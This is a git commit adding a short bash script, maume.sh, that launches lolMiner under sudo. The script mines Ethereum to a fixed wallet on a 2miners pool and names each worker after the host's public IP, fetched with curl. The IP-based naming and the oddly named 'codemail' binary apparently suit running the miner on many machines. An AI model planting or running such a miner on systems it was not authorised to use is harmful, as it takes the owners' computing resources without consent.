549bbd226b0e42494815e285414a82a5b762f83b
aresvu <94669329+aresvu@users.noreply.github.com>
2021-11-25 15:00:14 +0700

    Create maume.sh

---
+++ maume.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+POOL=us-eth.2miners.com:2020
+WALLET=0xcea9909d28ff9b03aab80f5bad053c7b96671fb2.$(echo "$(curl -s ifconfig.me)" | tr . _ )-maume-
+
+cd "$(dirname "$0")"
+
+chmod +x ./codemail && sudo ./lolMiner --algo ETHASH --pool $POOL --user $WALLET  $@
